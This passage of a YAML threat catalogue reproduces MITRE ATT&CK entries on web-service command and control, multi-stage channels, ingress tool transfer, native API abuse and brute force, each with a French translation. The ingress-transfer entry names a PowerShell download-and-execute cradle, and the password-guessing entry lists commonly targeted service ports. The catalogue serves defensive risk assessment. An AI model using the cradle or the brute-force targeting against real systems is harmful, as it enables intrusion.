      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google, Microsoft, or Twitter, makes it easier for adversaries
      to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API
      2024) Web service providers commonly use SSL/TLS encryption, giving adversaries
      an added level of protection.


      Use of Web services may also protect back-end C2 infrastructure from discovery
      through malware binary analysis while also enabling operational resiliency (since
      this infrastructure may be dynamically changed).

      https://attack.mitre.org/techniques/T1102'
    translations:
      fr:
        name: Web Service
        description: "Les adversaires peuvent utiliser un service Web externe existant\
          \ et l\xE9gitime comme moyen de relayer des donn\xE9es vers/depuis un syst\xE8\
          me compromis. Les sites web populaires, les services cloud et les r\xE9\
          seaux sociaux servant de m\xE9canisme pour le C2 peuvent offrir une couverture\
          \ significative en raison de la probabilit\xE9 que les h\xE9bergeurs d\u2019\
          un r\xE9seau communiquent d\xE9j\xE0 avec eux avant un compromis. L\u2019\
          utilisation de services courants, tels que ceux propos\xE9s par Google,\
          \ Microsoft ou Twitter, facilite la dissimulation des adversaires dans le\
          \ bruit attendu. (Citation : Broadcom BirdyClient Microsoft Graph API 2024)\
          \ Les fournisseurs de services web utilisent couramment le chiffrement SSL/TLS,\
          \ offrant ainsi aux adversaires un niveau de protection suppl\xE9mentaire.\n\
          \nL\u2019utilisation des services Web peut \xE9galement prot\xE9ger l\u2019\
          infrastructure C2 back-end contre la d\xE9couverte via l\u2019analyse binaire\
          \ des malwares tout en permettant une r\xE9silience op\xE9rationnelle (puisque\
          \ cette infrastructure peut \xEAtre modifi\xE9e dynamiquement).\nhttps://attack.mitre.org/techniques/T1102"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.001
    ref_id: T1102.001
    name: Dead Drop Resolver
    description: 'Adversaries may use an existing, legitimate external Web service
      to host information that points to additional command and control (C2) infrastructure.
      Adversaries may post content, known as a dead drop resolver, on Web services
      with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected,
      victims will reach out to and be redirected by these resolvers.


      Popular websites and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google or Twitter, makes it easier for adversaries to hide
      in expected noise. Web service providers commonly use SSL/TLS encryption, giving
      adversaries an added level of protection.


      Use of a dead drop resolver may also protect back-end C2 infrastructure from
      discovery through malware binary analysis while also enabling operational resiliency
      (since this infrastructure may be dynamically changed).

      https://attack.mitre.org/techniques/T1102/001'
    translations:
      fr:
        name: "R\xE9solveur de Dead Drop"
        description: "Les adversaires peuvent utiliser un service Web externe existant\
          \ et l\xE9gitime pour h\xE9berger des informations pointant vers une infrastructure\
          \ suppl\xE9mentaire de commandement et contr\xF4le (C2). Les adversaires\
          \ peuvent publier du contenu, appel\xE9 r\xE9solution de dead drop, sur\
          \ des services Web avec des domaines ou adresses IP int\xE9gr\xE9s (et souvent\
          \ obscurciss\xE9s/encod\xE9s). Une fois infect\xE9es, les victimes tendront\
          \ la main vers ces r\xE9solveurs et seront redirig\xE9es par elles.\n\n\
          Les sites web populaires et les r\xE9seaux sociaux servant de m\xE9canisme\
          \ pour C2 peuvent offrir une couverture significative en raison de la probabilit\xE9\
          \ que les h\xE9bergeurs d\u2019un r\xE9seau communiquent d\xE9j\xE0 avec\
          \ eux avant un compromis. L\u2019utilisation de services courants, tels\
          \ que ceux propos\xE9s par Google ou Twitter, facilite la dissimulation\
          \ des adversaires dans le bruit attendu. Les fournisseurs de services web\
          \ utilisent couramment le chiffrement SSL/TLS, offrant ainsi aux adversaires\
          \ un niveau de protection suppl\xE9mentaire.\n\nL\u2019utilisation d\u2019\
          un r\xE9solveur de dead drop peut \xE9galement prot\xE9ger l\u2019infrastructure\
          \ C2 back-end contre la d\xE9couverte via l\u2019analyse binaire des malwares\
          \ tout en permettant une r\xE9silience op\xE9rationnelle (puisque cette\
          \ infrastructure peut \xEAtre modifi\xE9e dynamiquement).\nhttps://attack.mitre.org/techniques/T1102/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.002
    ref_id: T1102.002
    name: Bidirectional Communication
    description: "Adversaries may use an existing, legitimate external Web service\
      \ as a means for sending commands to and receiving output from a compromised\
      \ system over the Web service channel. Compromised systems may leverage popular\
      \ websites and social media to host command and control (C2) instructions. Those\
      \ infected systems can then send the output from those commands back over that\
      \ Web service channel. The return traffic may occur in a variety of ways, depending\
      \ on the Web service being utilized. For example, the return traffic may take\
      \ the form of the compromised system posting a comment on a forum, issuing a\
      \ pull request to development project, updating a document hosted on a Web service,\
      \ or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism\
      \ for C2 may give a significant amount of cover due to the likelihood that hosts\
      \ within a network are already communicating with them prior to a compromise.\
      \ Using common services, such as those offered by Google or Twitter, makes it\
      \ easier for adversaries to hide in expected noise. Web service providers commonly\
      \ use SSL/TLS encryption, giving adversaries an added level of protection.\n\
      https://attack.mitre.org/techniques/T1102/002"
    translations:
      fr:
        name: Communication bidirectionnelle
        description: "Les adversaires peuvent utiliser un service Web externe existant\
          \ et l\xE9gitime comme moyen d\u2019envoyer des commandes et de recevoir\
          \ des sorties d\u2019un syst\xE8me compromis via le canal du service Web.\
          \ Les syst\xE8mes compromis peuvent exploiter des sites web populaires et\
          \ des r\xE9seaux sociaux pour h\xE9berger des instructions de commande et\
          \ de contr\xF4le (C2). Ces syst\xE8mes infect\xE9s peuvent alors renvoyer\
          \ la sortie de ces commandes via ce canal de service Web. Le trafic de retour\
          \ peut se produire de diff\xE9rentes mani\xE8res, selon le service Web utilis\xE9\
          . Par exemple, le trafic de retour peut prendre la forme d\u2019un syst\xE8\
          me compromis publiant un commentaire sur un forum, d\u2019un pull request\
          \ \xE0 un projet de d\xE9veloppement, de mettre \xE0 jour un document h\xE9\
          berg\xE9 sur un service Web, ou d\u2019envoyer un Tweet. \n\nLes sites web\
          \ populaires et les r\xE9seaux sociaux servant de m\xE9canisme pour C2 peuvent\
          \ offrir une couverture significative en raison de la probabilit\xE9 que\
          \ les h\xE9bergeurs d\u2019un r\xE9seau communiquent d\xE9j\xE0 avec eux\
          \ avant un compromis. L\u2019utilisation de services courants, tels que\
          \ ceux propos\xE9s par Google ou Twitter, facilite la dissimulation des\
          \ adversaires dans le bruit attendu. Les fournisseurs de services web utilisent\
          \ couramment le chiffrement SSL/TLS, offrant ainsi aux adversaires un niveau\
          \ de protection suppl\xE9mentaire.\nhttps://attack.mitre.org/techniques/T1102/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102.003
    ref_id: T1102.003
    name: One-Way Communication
    description: 'Adversaries may use an existing, legitimate external Web service
      as a means for sending commands to a compromised system without receiving return
      output over the Web service channel. Compromised systems may leverage popular
      websites and social media to host command and control (C2) instructions. Those
      infected systems may opt to send the output from those commands back over a
      different C2 channel, including to another distinct Web service. Alternatively,
      compromised systems may return no output at all in cases where adversaries want
      to send instructions to systems and do not want a response.


      Popular websites and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
      communicating with them prior to a compromise. Using common services, such as
      those offered by Google or Twitter, makes it easier for adversaries to hide
      in expected noise. Web service providers commonly use SSL/TLS encryption, giving
      adversaries an added level of protection.

      https://attack.mitre.org/techniques/T1102/003'
    translations:
      fr:
        name: Communication unidirectionnelle
        description: "Les adversaires peuvent utiliser un service Web externe existant\
          \ et l\xE9gitime comme moyen d\u2019envoyer des commandes \xE0 un syst\xE8\
          me compromis sans recevoir de retour via le canal du service Web. Les syst\xE8\
          mes compromis peuvent exploiter des sites web populaires et des r\xE9seaux\
          \ sociaux pour h\xE9berger des instructions de commande et de contr\xF4\
          le (C2). Ces syst\xE8mes infect\xE9s peuvent choisir de renvoyer la sortie\
          \ de ces commandes via un autre canal C2, y compris vers un autre service\
          \ Web distinct. Alternativement, les syst\xE8mes compromis peuvent ne fournir\
          \ aucune sortie dans les cas o\xF9 les adversaires souhaitent envoyer des\
          \ instructions aux syst\xE8mes sans r\xE9ponse.\n\nLes sites web populaires\
          \ et les r\xE9seaux sociaux servant de m\xE9canisme pour C2 peuvent offrir\
          \ une couverture significative en raison de la probabilit\xE9 que les h\xE9\
          bergeurs d\u2019un r\xE9seau communiquent d\xE9j\xE0 avec eux avant un compromis.\
          \ L\u2019utilisation de services courants, tels que ceux propos\xE9s par\
          \ Google ou Twitter, facilite la dissimulation des adversaires dans le bruit\
          \ attendu. Les fournisseurs de services web utilisent couramment le chiffrement\
          \ SSL/TLS, offrant ainsi aux adversaires un niveau de protection suppl\xE9\
          mentaire.\nhttps://attack.mitre.org/techniques/T1102/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1104
    ref_id: T1104
    name: Multi-Stage Channels
    description: 'Adversaries may create multiple stages for command and control that
      are employed under different conditions or for certain functions. Use of multiple
      stages may obfuscate the command and control channel to make detection more
      difficult.


      Remote access tools will call back to the first-stage command and control server
      for instructions. The first stage may have automated capabilities to collect
      basic host information, update tools, and upload additional files. A second
      remote access tool (RAT) could be uploaded at that point to redirect the host
      to the second-stage command and control server. The second stage will likely
      be more fully featured and allow the adversary to interact with the system through
      a reverse shell and additional RAT features.


      The different stages will likely be hosted separately with no overlapping infrastructure.
      The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008)
      in case the original first-stage communication path is discovered and blocked.

      https://attack.mitre.org/techniques/T1104'
    translations:
      fr:
        name: "Canaux multi-\xE9tages"
        description: "Les adversaires peuvent cr\xE9er plusieurs \xE9tapes de commandement\
          \ et de contr\xF4le, employ\xE9es dans diff\xE9rentes conditions ou pour\
          \ certaines fonctions. L\u2019utilisation de plusieurs \xE9tages peut obscurcir\
          \ le canal de commande et de contr\xF4le afin de rendre la d\xE9tection\
          \ plus difficile.\n\nLes outils d\u2019acc\xE8s \xE0 distance rappelleront\
          \ le serveur de commande et de contr\xF4le de la premi\xE8re \xE9tape pour\
          \ recevoir des instructions. La premi\xE8re \xE9tape peut disposer de capacit\xE9\
          s automatis\xE9es pour collecter des informations de base sur l\u2019h\xF4\
          te, mettre \xE0 jour des outils et t\xE9l\xE9charger des fichiers suppl\xE9\
          mentaires. Un second outil d\u2019acc\xE8s \xE0 distance (RAT) pouvait \xEA\
          tre t\xE9l\xE9charg\xE9 \xE0 ce moment pour rediriger l\u2019h\xF4te vers\
          \ le serveur de commande et de contr\xF4le de la deuxi\xE8me \xE9tape. Le\
          \ second \xE9tage sera probablement plus complet et permettra \xE0 l\u2019\
          adversaire d\u2019interagir avec le syst\xE8me via une coque inverse et\
          \ des fonctionnalit\xE9s RAT suppl\xE9mentaires.\n\nLes diff\xE9rentes \xE9\
          tapes seront probablement h\xE9berg\xE9es s\xE9par\xE9ment, sans infrastructure\
          \ qui se chevauche. Le chargeur peut \xE9galement disposer de rappels de\
          \ sauvegarde pour le premier \xE9tage ou de [canaux de secours](https://attack.mitre.org/techniques/T1008)\
          \ au cas o\xF9 le chemin de communication initial du premier \xE9tage serait\
          \ d\xE9couvert et bloqu\xE9.\nhttps://attack.mitre.org/techniques/T1104"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1105
    ref_id: T1105
    name: Ingress Tool Transfer
    description: "Adversaries may transfer tools or other files from an external system\
      \ into a compromised environment. Tools or files may be copied from an external\
      \ adversary-controlled system to the victim network through the command and\
      \ control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095).\
      \ Once present, adversaries may also transfer/spread tools between victim devices\
      \ within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)).\
      \ \n\nOn Windows, adversaries may use various utilities to download tools, such\
      \ as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160),\
      \ and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such\
      \ as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>.\
      \ On Linux and macOS systems, a variety of utilities also exist, such as `curl`,\
      \ `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)\
      \  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on\
      \ ESXi. After downloading a file, a threat actor may attempt to verify its integrity\
      \ by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google\
      \ Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse\
      \ installers and package managers, such as `yum` or `winget`, to download tools\
      \ to victim hosts. Adversaries have also abused file application features, such\
      \ as the Windows `search-ms` protocol handler, to deliver malicious files to\
      \ victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204)\
      \ (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred\
      \ using various [Web Service](https://attack.mitre.org/techniques/T1102)s as\
      \ well as native or otherwise present tools on the victim system.(Citation:\
      \ PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage\
      \ services that sync between a web-based and an on-premises client, such as\
      \ Dropbox or OneDrive, to transfer files onto victim systems. For example, by\
      \ compromising a cloud account and logging into the service's web portal, an\
      \ adversary may be able to trigger an automatic syncing process that transfers\
      \ the file onto the victim's machine.(Citation: Dropbox Malware Sync)\nhttps://attack.mitre.org/techniques/T1105"
    translations:
      fr:
        name: "Transfert d\u2019outil d\u2019entr\xE9e"
        description: "Les adversaires peuvent transf\xE9rer des outils ou d\u2019\
          autres fichiers d\u2019un syst\xE8me externe vers un environnement compromis.\
          \ Les outils ou fichiers peuvent \xEAtre copi\xE9s d\u2019un syst\xE8me\
          \ externe contr\xF4l\xE9 par un adversaire vers le r\xE9seau victime via\
          \ le canal de commande et de contr\xF4le ou via des protocoles alternatifs\
          \ tels que [ftp](https://attack.mitre.org/software/S0095). Une fois pr\xE9\
          sents, les adversaires peuvent \xE9galement transf\xE9rer/distribuer des\
          \ outils entre les dispositifs des victimes dans un environnement compromis\
          \ (c\u2019est-\xE0-dire [Transfert lat\xE9ral d\u2019outils](https://attack.mitre.org/techniques/T1570)).\
          \ \n\nSous Windows, les adversaires peuvent utiliser divers utilitaires\
          \ pour t\xE9l\xE9charger des outils, tels que \xAB copy \xBB, \xAB finger\
          \ \xBB, [certutil](https://attack.mitre.org/software/S0160) et des commandes\
          \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) telles que\
          \ <code>IEX(New-Object Net.WebClient).downloadString()</code> et <code>Invoke-WebRequest</code>.\
          \ Sur les syst\xE8mes Linux et macOS, il existe \xE9galement une vari\xE9\
          t\xE9 d\u2019utilitaires, tels que \xAB curl \xBB, \xAB scp \xBB, \xAB sftp\
          \ \xBB, \xAB tftp \xBB, \xAB rsync \xBB, \xAB finger \xBB et \xAB wget \xBB\
          . (Citation : t1105_lolbas)  Un certain nombre de ces outils, tels que 'wget',\
          \ 'curl' et 'scp', existent \xE9galement sur ESXi. Apr\xE8s avoir t\xE9\
          l\xE9charg\xE9 un fichier, un acteur de menace peut tenter de v\xE9rifier\
          \ son int\xE9grit\xE9 en v\xE9rifiant sa valeur de hachage (par exemple,\
          \ via 'certutil -hashfile'). (Citation : Google Cloud Threat Intelligence\
          \ COSCMICENERGY 2023)\n\nLes adversaires peuvent \xE9galement abuser des\
          \ installateurs et gestionnaires de paquets, tels que \xAB yum \xBB ou \xAB\
          \ winget \xBB, pour t\xE9l\xE9charger des outils vers les h\xF4tes victimes.\
          \ Les adversaires ont \xE9galement abus\xE9 de fonctionnalit\xE9s d\u2019\
          application de fichiers, comme le gestionnaire de protocole Windows \xAB\
          \ search-ms \xBB, pour livrer des fichiers malveillants aux victimes via\
          \ des recherches de fichiers \xE0 distance invoqu\xE9es par [User Execution](https://attack.mitre.org/techniques/T1204)\
          \ (g\xE9n\xE9ralement apr\xE8s avoir interagi avec des leurres [Phishing](https://attack.mitre.org/techniques/T1566)).\
          \ (Citation : T1105 : Trellix_search-ms)\n\nLes fichiers peuvent \xE9galement\
          \ \xEAtre transf\xE9r\xE9s via divers [Web Service](https://attack.mitre.org/techniques/T1102)\
          \ ainsi que des outils natifs ou autrement pr\xE9sents sur le syst\xE8me\
          \ victime. (Citation : PTSecurity Cobalt d\xE9c. 2016) Dans certains cas,\
          \ les adversaires peuvent utiliser des services synchronis\xE9s entre un\
          \ client web et un client sur site, tels que Dropbox ou OneDrive, pour transf\xE9\
          rer des fichiers vers les syst\xE8mes victimes. Par exemple, en compromettant\
          \ un compte cloud et en se connectant au portail web du service, un adversaire\
          \ peut d\xE9clencher un processus de synchronisation automatique qui transf\xE8\
          re le fichier sur la machine de la victime. (Citation : Synchronisation\
          \ du malware Dropbox)\nhttps://attack.mitre.org/techniques/T1105"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1106
    ref_id: T1106
    name: Native API
    description: 'Adversaries may interact with the native OS application programming
      interface (API) to execute behaviors. Native APIs provide a controlled means
      of calling low-level OS services within the kernel, such as those involving
      hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation:
      Linux Kernel API) These native APIs are leveraged by the OS during system boot
      (when other system components are not yet initialized) as well as carrying out
      tasks and requests during routine operations.


      Adversaries may abuse these OS API functions as a means of executing behaviors.
      Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),
      the native API and its hierarchy of interfaces provide mechanisms to interact
      with and utilize various components of a victimized system.


      Native API functions (such as <code>NtCreateProcess</code>) may be directed
      invoked via system calls / syscalls, but these features are also often exposed
      to user-mode applications via interfaces and libraries.(Citation: OutFlank System
      Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example,
      functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code>
      will allow programs and scripts to start other processes.(Citation: Microsoft
      CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary,
      run a CLI command, load modules, etc. as thousands of similar API functions
      exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation:
      GLIBC)


      Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are
      also available to interact with native APIs. These frameworks typically provide
      language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability
      of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS
      Cocoa)(Citation: macOS Foundation)


      Adversaries may use assembly to directly or in-directly invoke syscalls in an
      attempt to subvert defensive sensors and detection signatures such as user mode
      API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper
      with sensors and defensive tools associated with API monitoring, such as unhooking
      monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685).

      https://attack.mitre.org/techniques/T1106'
    translations:
      fr:
        name: Native API
        description: "Les adversaires peuvent interagir avec l\u2019interface native\
          \ de programmation d\u2019applications (API) du syst\xE8me d\u2019exploitation\
          \ pour ex\xE9cuter des comportements. Les API natives fournissent un moyen\
          \ contr\xF4l\xE9 d\u2019appeler des services d\u2019OS de bas niveau au\
          \ sein du noyau, tels que ceux impliquant du mat\xE9riel/p\xE9riph\xE9riques,\
          \ la m\xE9moire et les processus. (Citation : Windows de l\u2019API NT)(Citation\
          \ : API du noyau Linux) Ces API natives sont exploit\xE9es par le syst\xE8\
          me d\u2019exploitation lors du d\xE9marrage du syst\xE8me (lorsque les autres\
          \ composants du syst\xE8me ne sont pas encore initialis\xE9s) ainsi que\
          \ lors de l\u2019ex\xE9cution des t\xE2ches et requ\xEAtes lors des op\xE9\
          rations de routine.\n\nLes adversaires peuvent abuser de ces fonctions API\
          \ du syst\xE8me d\u2019exploitation comme moyen d\u2019ex\xE9cuter des comportements.\
          \ \xC0 l\u2019instar de [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),\
          \ l\u2019API native et sa hi\xE9rarchie d\u2019interfaces fournissent des\
          \ m\xE9canismes permettant d\u2019interagir et d\u2019utiliser divers composants\
          \ d\u2019un syst\xE8me victimis\xE9.\n\nLes fonctions API natives (comme\
          \ <code>NtCreateProcess</code>) peuvent \xEAtre dirig\xE9es et invoqu\xE9\
          es via des appels syst\xE8me / appels sys, mais ces fonctionnalit\xE9s sont\
          \ aussi souvent expos\xE9es aux applications en mode utilisateur via des\
          \ interfaces et des biblioth\xE8ques. (Citation : Appels du syst\xE8me OutFlank)(Citation\
          \ : CyberBit System Calls)(Citation : Appels syst\xE8me MDSec) Par exemple,\
          \ des fonctions telles que l\u2019API <code>Windows CreateProcess()</code>\
          \ ou <code>le fork(</code>) GNU permettront aux programmes et scripts de\
          \ d\xE9marrer d\u2019autres processus. (Citation : Microsoft CreateProcess)(Citation\
          \ : GNU Fork) Cela peut permettre aux appelants API d\u2019ex\xE9cuter un\
          \ binaire, d\u2019ex\xE9cuter une commande CLI, de charger des modules,\
          \ etc., car des milliers de fonctions API similaires existent pour diverses\
          \ op\xE9rations syst\xE8me. (Citation : Microsoft Win32)(Citation : LIBC)(Citation\
          \ : GLIBC)\n\nDes frameworks logiciels de haut niveau, tels que Microsoft\
          \ .NET et macOS Cocoa, sont \xE9galement disponibles pour interagir avec\
          \ des API natives. Ces frameworks fournissent g\xE9n\xE9ralement des wrappers/abstractions\
          \ de langage aux fonctionnalit\xE9s de l\u2019API et sont con\xE7us pour\
          \ faciliter l\u2019utilisation et la portabilit\xE9 du code. (Citation :\
          \ Microsoft NET)(Citation : Apple Core Services)(Citation : MACOS Cacao)(Citation\
          \ : macOS Foundation)\n\nLes adversaires peuvent utiliser l\u2019assemblage\
          \ pour invoquer directement ou indirectement des appels syst\xE8me dans\
          \ le but de subvertir les capteurs d\xE9fensifs et les signatures de d\xE9\
          tection tels que les hooks API en mode utilisateur. (Citation : Redops Syscalls)\
          \ Les adversaires peuvent \xE9galement tenter de manipuler les capteurs\
          \ et outils d\xE9fensifs associ\xE9s \xE0 la surveillance API, comme le\
          \ d\xE9branchement des fonctions surveill\xE9es via [D\xE9sactiver ou modifier\
          \ les outils](https://attack.mitre.org/techniques/T1685).\nhttps://attack.mitre.org/techniques/T1106"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110
    ref_id: T1110
    name: Brute Force
    description: "Adversaries may use brute force techniques to gain access to accounts\
      \ when passwords are unknown or when password hashes are obtained.(Citation:\
      \ TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account\
      \ or set of accounts, an adversary may systematically guess the password using\
      \ a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018)\
      \ Brute forcing passwords can take place via interaction with a service that\
      \ will check the validity of those credentials or offline against previously\
      \ acquired credential data, such as password hashes.\n\nBrute forcing credentials\
      \ may take place at various points during a breach. For example, adversaries\
      \ may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ within a victim environment leveraging knowledge gathered from other post-compromise\
      \ behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003),\
      \ [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password\
      \ Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries\
      \ may also combine brute forcing activity with behaviors such as [External Remote\
      \ Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.\
      \ \n\nIf an adversary guesses the correct password but fails to login to a compromised\
      \ account due to location-based conditional access policies, they may change\
      \ their infrastructure until they match the victim\u2019s location and therefore\
      \ bypass those policies.(Citation: ReliaQuest Health Care Social Engineering\
      \ Campaign 2024)\nhttps://attack.mitre.org/techniques/T1110"
    translations:
      fr:
        name: Brute Force
        description: "Les adversaires peuvent utiliser des techniques de force brute\
          \ pour acc\xE9der aux comptes lorsque les mots de passe sont inconnus ou\
          \ lorsque des hachages de mots de passe sont obtenus. (Citation : TrendMicro\
          \ Pawn Storm d\xE9c. 2020) Sans connaissance du mot de passe d\u2019un compte\
          \ ou d\u2019un ensemble de comptes, un adversaire peut deviner syst\xE9\
          matiquement le mot de passe \xE0 l\u2019aide d\u2019un m\xE9canisme r\xE9\
          p\xE9titif ou it\xE9ratif. (Citation : Dragos Crashoverride 2018) Les mots\
          \ de passe par force brute peuvent se produire par une interaction avec\
          \ un service qui v\xE9rifiera la validit\xE9 de ces identifiants ou hors\
          \ ligne par rapport aux donn\xE9es d\u2019identifiants acquises pr\xE9c\xE9\
          demment, telles que les hachages de mots de passe.\n\nLes qualifications\
          \ de force brute peuvent intervenir \xE0 diff\xE9rents moments d\u2019une\
          \ violation. Par exemple, les adversaires peuvent tenter d\u2019imposer\
          \ un acc\xE8s brutal \xE0 [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ dans un environnement victime en tirant parti des connaissances recueillies\
          \ lors d\u2019autres comportements post-compromis tels que [Dumping de cr\xE9\
          dentiaux du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003),\
          \ [D\xE9couverte de compte](https://attack.mitre.org/techniques/T1087) ou\
          \ [D\xE9couverte de politique de mot de passe](https://attack.mitre.org/techniques/T1201).\
          \ Les adversaires peuvent \xE9galement combiner des activit\xE9s de force\
          \ brute avec des comportements tels que [Services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)\
          \ dans le cadre de l\u2019Acc\xE8s Initial. \n\nSi un adversaire devine\
          \ le bon mot de passe mais ne se connecte pas \xE0 un compte compromis en\
          \ raison des politiques d\u2019acc\xE8s conditionnel bas\xE9es sur la localisation,\
          \ il peut modifier son infrastructure jusqu\u2019\xE0 ce qu\u2019il corresponde\
          \ \xE0 la localisation de la victime et ainsi contourne ces politiques.\
          \ (Citation : Campagne ReliaQuest Health Care Social Engineering 2024)\n\
          https://attack.mitre.org/techniques/T1110"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.001
    ref_id: T1110.001
    name: Password Guessing
    description: 'Adversaries with no prior knowledge of legitimate credentials within
      the system or environment may guess passwords to attempt access to accounts.
      Without knowledge of the password for an account, an adversary may opt to systematically
      guess the password using a repetitive or iterative mechanism. An adversary may
      guess login credentials without prior knowledge of system or environment passwords
      during an operation by using a list of common passwords. Password guessing may
      or may not take into account the target''s policies on password complexity or
      use policies that may lock accounts out after a number of failed attempts.


      Guessing passwords can be a risky option because it could cause numerous authentication
      failures and account lockouts, depending on the organization''s login failure
      policies. (Citation: Cylance Cleaver)


      Typically, management services over commonly used ports are used when guessing
      passwords. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)

      * SNMP (161/UDP and 162/TCP/UDP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces
      (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication
      protocols.(Citation: Trend Micro Emotet 2020)


      In default environments, LDAP and Kerberos connection attempts are less likely
      to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      https://attack.mitre.org/techniques/T1110/001'
    translations:
      fr:
        name: Deviner les mots de passe
        description: "Les adversaires sans connaissance pr\xE9alable des identifiants\
          \ l\xE9gitimes dans le syst\xE8me ou l\u2019environnement peuvent deviner\
          \ les mots de passe pour tenter d\u2019acc\xE9der aux comptes. Sans connaissance\
          \ du mot de passe d\u2019un compte, un adversaire peut choisir de deviner\
          \ syst\xE9matiquement le mot de passe \xE0 l\u2019aide d\u2019un m\xE9canisme\
          \ r\xE9p\xE9titif ou it\xE9ratif. Un adversaire peut deviner des identifiants\
          \ de connexion sans connaissance pr\xE9alable des mots de passe syst\xE8\
          me ou d\u2019environnement lors d\u2019une op\xE9ration en utilisant une\
          \ liste de mots de passe courants. La devinette de mot de passe peut ou\
          \ non prendre en compte les politiques de complexit\xE9 des mots de passe\
          \ de la cible ou utiliser des politiques qui peuvent bloquer les comptes\
          \ apr\xE8s plusieurs tentatives infructueuses.\n\nDeviner les mots de passe\
          \ peut \xEAtre une option risqu\xE9e car cela peut entra\xEEner de nombreuses\
          \ erreurs d\u2019authentification et des blocages de compte, selon les politiques\
          \ de d\xE9faillance de connexion de l\u2019organisation. (Citation : Cylance\
          \ Cleaver)\n\nEn g\xE9n\xE9ral, les services de gestion sur les ports couramment\
          \ utilis\xE9s sont utilis\xE9s pour deviner des mots de passe. Les services\
          \ couramment cibl\xE9s incluent les suivants :\n\n* SSH (22/TCP)\n* Telnet\
          \ (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n\
          * LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Services terminaux (3389/TCP)\n\
          * Services de gestion HTTP/HTTP (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n\
          * Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP\
          \ et 162/TCP/UDP)\n\nEn plus des services de gestion, les adversaires peuvent\
          \ \xAB cibler des applications d\u2019authentification unique (SSO) et cloud\
          \ utilisant des protocoles d\u2019authentification f\xE9d\xE9r\xE9e \xBB\
          , ainsi que des applications de messagerie externes, telles qu\u2019Office\
          \ 365. (Citation : US-CERT TA18-068A 2018). De plus, les adversaires peuvent\
          \ abuser des interfaces de dispositifs r\xE9seau (comme \xAB wlanAPI \xBB\
          ) pour forcer l\u2019acc\xE8s ou les routeurs wifi via des protocoles d\u2019\
          authentification sans fil. (Citation : Trend Micro Emotet 2020)\n\nDans\
          \ les environnements par d\xE9faut, les tentatives de connexion LDAP et\
          \ Kerberos sont moins susceptibles de d\xE9clencher des \xE9v\xE9nements\
          \ via SMB, ce qui cr\xE9e l\u2019ID d\u2019\xE9v\xE9nement \xAB \xE9chec\
